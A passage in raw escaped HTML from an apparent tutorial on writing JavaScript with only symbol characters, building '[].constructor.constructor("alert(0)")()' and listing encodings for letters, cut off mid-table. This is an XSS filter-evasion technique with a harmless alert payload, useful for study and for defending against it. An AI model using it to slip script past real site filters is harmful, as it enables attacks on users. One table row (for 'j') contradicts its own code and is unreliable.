class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;#39;(&amp;#39;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;                                                                                                                                                                          &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;#39;0&amp;#39;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;([]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]][&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]][&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;({}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]];&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// &amp;#39;)&amp;#39;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                                                                                                                                         &lt;span class=&quot;c1&quot;&gt;// &amp;quot;alert&amp;quot; += &amp;quot;(0)&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Final concatenated code - full javascript non-alphanumeric code without using the [object Window]&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Generating &lt;code&gt;&quot;[].constructor.constructor(&quot;alert(0)&quot;)();&quot;&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;&quot;alert(0)&quot;&lt;/code&gt; was stored at variable &lt;code&gt;_&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;   * Constructor property &amp;amp;                          Value&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;   * Constructor function call&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;   */&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;([]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;                                             &lt;span class=&quot;c1&quot;&gt;// [].&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;({}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// c&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;({}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                                &lt;span class=&quot;c1&quot;&gt;// o&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;([][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                            &lt;span class=&quot;c1&quot;&gt;// n&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                    &lt;span class=&quot;c1&quot;&gt;// s&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                              &lt;span class=&quot;c1&quot;&gt;// t&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                            &lt;span class=&quot;c1&quot;&gt;// r&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                        &lt;span class=&quot;c1&quot;&gt;// u&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;({}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// c&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                              &lt;span class=&quot;c1&quot;&gt;// t&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;({}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                               &lt;span class=&quot;c1&quot;&gt;// o&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;                             &lt;span class=&quot;c1&quot;&gt;// r&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;                                                  &lt;span class=&quot;c1&quot;&gt;// .&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;({}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// c&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;({}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                                &lt;span class=&quot;c1&quot;&gt;// o&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;([][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                            &lt;span class=&quot;c1&quot;&gt;// n&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                    &lt;span class=&quot;c1&quot;&gt;// s&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                              &lt;span class=&quot;c1&quot;&gt;// t&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                            &lt;span class=&quot;c1&quot;&gt;// r&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                        &lt;span class=&quot;c1&quot;&gt;// u&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;({}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// c&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                              &lt;span class=&quot;c1&quot;&gt;// t&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;({}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;                                &lt;span class=&quot;c1&quot;&gt;// o&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;                              &lt;span class=&quot;c1&quot;&gt;// r&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)();&lt;/span&gt;                                          &lt;span class=&quot;c1&quot;&gt;// (“alert(0)”)();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}());&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&quot;encoded-possible-characters-list&quot;&gt;#4 Encoded possible characters list&lt;/h2&gt;

&lt;p&gt;If you find a method to retrieve the unknowns, please mail me.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Char index&lt;/th&gt;
      &lt;th&gt;Return char&lt;/th&gt;
      &lt;th&gt;Non-Alphanumeric&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;“false”[1]&lt;/td&gt;
      &lt;td&gt;‘a’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([![]]+[])  [+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“[object Object]”[2]&lt;/td&gt;
      &lt;td&gt;‘b’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;({}+[])     [!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“[object Object]”[5]&lt;/td&gt;
      &lt;td&gt;‘c’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;({}+[])     [!+[]+!+[]+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“undefined”[2]&lt;/td&gt;
      &lt;td&gt;‘d’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([][&#39;&#39;]+[]) [!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“false”[4]&lt;/td&gt;
      &lt;td&gt;‘e’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([![]]+[])  [!+[]+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“false”[0]&lt;/td&gt;
      &lt;td&gt;‘f’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([![]]+[])  [+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;‘g’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;unknown&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;‘h’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;unknown&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“undefined”[5]&lt;/td&gt;
      &lt;td&gt;‘i’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([][&#39;&#39;]+[]) [!+[]+!+[]+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“[object Object]”[3]&lt;/td&gt;
      &lt;td&gt;‘j’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([][&#39;&#39;]+[]) [!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;‘k’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;unknown&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“false”[2]&lt;/td&gt;
      &lt;td&gt;‘l’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([![]]+[])  [!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;‘m’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;unknown&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“undefined”[1]&lt;/td&gt;
      &lt;td&gt;‘n’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([][&#39;&#39;]+[]) [+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“[object Object]”[1]&lt;/td&gt;
      &lt;td&gt;‘o’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;({}+[])     [+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;unknown&lt;/td&gt;
